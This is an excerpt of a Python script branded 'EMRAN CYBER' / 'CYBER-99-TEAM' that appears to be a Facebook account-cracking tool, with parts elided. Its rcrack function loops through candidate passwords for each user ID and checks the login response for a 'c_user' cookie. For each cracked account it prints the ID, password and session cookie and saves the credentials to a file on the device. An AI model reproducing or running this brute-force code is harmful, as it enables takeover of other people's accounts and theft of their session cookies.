...
EMRAN = '\x1b[1;102m' # BELAKANG HIJAU
...
\033[1;37m================= \33[32;45mCYBER-99-TEAM\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33m-EMRAN CYBER
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m EMRAN CYBER 
...
\033[1;37m================= \33[32;45mEMRAN-TEAM\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO EMRAN CYBER TEAM\33[0;m
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            free_fb = session.get('https://www.facebook.com/Alex.Emran.500').text
            log_data = {
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(EMRAN-CYBER-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/EMRAN-CYBER-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[EMRAN-TEAM] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
